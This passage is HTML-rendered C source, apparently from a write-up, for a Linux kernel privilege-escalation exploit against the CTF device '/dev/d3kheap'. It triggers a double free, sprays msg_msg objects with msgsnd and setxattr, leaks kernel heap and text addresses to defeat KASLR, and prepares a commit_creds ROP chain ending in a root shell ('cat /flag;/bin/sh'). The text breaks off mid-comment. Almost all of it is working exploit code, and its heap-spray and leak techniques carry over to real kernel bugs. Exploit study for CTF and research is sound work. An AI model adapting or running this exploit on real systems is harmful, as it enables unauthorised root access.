class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> MSG_COPY        040000  <span class="comment">/* copy (not remove) all queue messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_ADD     0x1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_EDIT    0x4321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_SHOW 0xbeef</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OBJ_DEL     0xdead</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82c6d580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000040</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">size_t</span> kernel_offset, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> dev_fd;</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">2</span>], pipe_fd2[<span class="number">2</span>], pipe_fd_1;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernelLeakQuery</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">switch</span> (kernel_text_leak &amp; <span class="number">0xfff</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6e9</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff812b76e9</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x980</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82101980</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x440</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e77440</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xde7</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82411de7</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x4f0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff817894f0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc90</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff833fac90</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x785</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff823c3785</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x990</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810b2990</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x900</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e49900</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x8b4</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8111b8b4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc40</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8204ac40</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x320</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff8155c320</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xee0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810d6ee0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x5e0</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff810e55e0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe80</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82f05e80</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x260</span>:</span><br><span class="line">            kernel_offset = kernel_text_leak - <span class="number">0xffffffff82ec0260</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] fill up your dict!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((kernel_offset % <span class="number">0x100000</span>) != <span class="number">0</span>) <span class="comment">// miss hit?</span></span><br><span class="line">        kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">return</span> kernel_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_ADD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, OBJ_DEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">long</span> mtype;</span><br><span class="line">        <span class="type">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;         <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security;     <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_search = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> kernel_text_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> page_offset_base_guess = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> msg_offset, msg_offset_count;</span><br><span class="line">    <span class="type">size_t</span> fake_ops_addr, fake_ops_offset, kmsg_addr;</span><br><span class="line">    <span class="type">int</span> kmsg_idx;</span><br><span class="line">    <span class="type">int</span> ms_qid[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">int</span> rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span> + i, <span class="number">0X1000</span> - <span class="number">8</span>);</span><br><span class="line">        ret = msgsnd(ms_qid[i], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak msg_queue addr from heap</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;Z&#x27;</span>, <span class="number">0x1000</span> - <span class="number">8</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x1000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (((buf[i] &amp; <span class="number">0xffff000000000000</span>) == <span class="number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (buf[i + <span class="number">3</span>] == (<span class="number">1024</span> - <span class="number">0x30</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, buf[i]);</span><br><span class="line">            kernel_heap_leak = buf[i];</span><br><span class="line">            kmsg_idx = (<span class="type">int</span>)(((<span class="type">char</span>*)(&amp;buf[i + <span class="number">2</span>]))[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            fake_ops_offset = i * <span class="number">8</span> + <span class="number">0x30</span> - <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (((buf[i] &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);</span><br><span class="line">            kernel_offset = kernelLeakQuery(buf[i]);</span><br><span class="line">            <span class="keyword">if</span> (kernel_offset != <span class="number">0xdeadbeef</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_text_leak = buf[i];</span><br><span class="line">                kernel_base += kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak &amp;&amp; kernel_heap_leak)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!kernel_heap_leak)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to leak kernel heap!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak msg_msg addr</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_leak - <span class="number">8</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    kmsg_addr = buf[(<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">/*puts(&quot;[*] leaking...&quot;);</span></span><br><span class="line"><span class="comment">    for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8 ; i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;[----data dump----] %d: %p\n&quot;, i, buf[i]);*/</span></span><br><span class="line">    fake_ops_addr = kmsg_addr - fake_ops_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UAF as fake ops addr at: %p, cal by msg idx: %d at addr: %p\n&quot;</span>, fake_ops_addr, kmsg_idx, kmsg_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak kernel text base if we didn&#x27;t leak it before</span></span><br><span class="line">    kernel_heap_search = kmsg_addr - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> leaking_times = <span class="number">0</span>; !kernel_text_leak; leaking_times++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);</span><br><span class="line">    </span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_search;</span><br><span class="line">        ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Now searching: %p\n&quot;</span>, kernel_heap_search);</span><br><span class="line"></span><br><span class="line">        ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">            kernel_heap_search += <span class="number">0x1000</span> - <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        msg_offset_count = <span class="number">0</span>;</span><br><span class="line">        msg_offset = <span class="number">0xdeadbeefbad4f00d</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = (<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i &lt; (<span class="number">0x2000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);</span><br><span class="line">            <span class="keyword">if</span> ((buf[i] &gt; <span class="number">0xffffffff81000000</span>) &amp;&amp; (buf[i] &lt; <span class="number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);</span><br><span class="line">                kernel_offset = kernelLeakQuery(buf[i]);</span><br><span class="line">                <span class="keyword">if</span> (kernel_offset != <span class="number">0xdeadbeef</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_text_leak = buf[i];</span><br><span class="line">                    kernel_base += kernel_offset;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!buf[i])</span><br><span class="line">                msg_offset = msg_offset_count * <span class="number">8</span>;</span><br><span class="line">            msg_offset_count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg_offset == <span class="number">0xdeadbeefbad4f00d</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] Failed to find next valid foothold!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        kernel_heap_search += msg_offset; <span class="comment">// to make the msg_msg-&gt;next == NULL, search from the last NULL</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">leak_out:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comfortably double free like A-&gt;B-&gt;A, its checking is as simple as the fastbin in ptmalloc2</span></span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = kernel_heap_search; <span class="comment">// a pointer to the heap is available, list_del (aka unlink) is easy to 